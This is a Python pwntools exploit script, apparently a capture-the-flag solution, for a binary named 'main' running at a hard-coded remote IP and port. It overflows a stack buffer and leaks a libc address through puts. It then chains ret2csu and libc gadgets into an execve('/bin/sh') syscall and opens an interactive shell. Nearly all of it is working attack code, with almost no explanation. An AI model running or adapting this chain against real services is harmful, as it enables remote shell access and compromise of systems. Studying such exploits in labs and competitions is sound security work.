from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./main')
libc = ELF('./libc.so.6')

debug = 0

if debug:
    io = process('./main')
else:
    io = remote('39.102.55.191',9999)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [0xe3afe,0xe3b01,0xe3b04]

pop_rdi = 0x0000000000401293 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000401291 # pop rsi ; pop r15 ; ret
puts_got = 0x404018
puts_plt = 0x401030
main_addr = 0x401225
read_plt = 0x401050
#setbuf_plt = 0x401040
bss_addr = 0x404040 
csu_pop = 0x40128a
csu_call = 0x401270

io.recvuntil(b"overflow here!")
over_flow = b'a' * 0x30  
over_flow += p64(bss_addr) # rbp
over_flow += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) # 泄漏libc
#over_flow += p64(pop_rdi) + p64(bss_addr + 0x10) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(setbuf_plt)

over_flow += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr) + p64(0) + p64(read_plt) 
# pop rbx rbp r12 r13 r14 r15 
## r15为目标地址，r14为rdx r13为rsi r12 为rdi rbx = 0 rbp =1
csu = p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_addr) + p64(0x1000) + p64(0x404028) + p64(csu_call)  # 0x404028 <read@got[plt]>
csu += p64(0) + p64(0) + p64(bss_addr) + p64(0) + p64(bss_addr) + p64(0x20) + p64(read_plt) 

over_flow += csu
over_flow += p64(main_addr)

#p()
io.send(over_flow)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['puts']
success("libc_base -->" + hex(libc_base))

pop_rsi = libc_base + 0x000000000002601f # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000142c92 # pop rdx ; ret
pop_rax = libc_base + 0x0000000000036174 # pop rax ; ret
syscall = libc_base + 0x000000000002284d # syscall
fack_stack =  b"/bin/sh\x00" + p64(pop_rdi)  + p64(bss_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
io.send(fack_stack)

io.interactive()

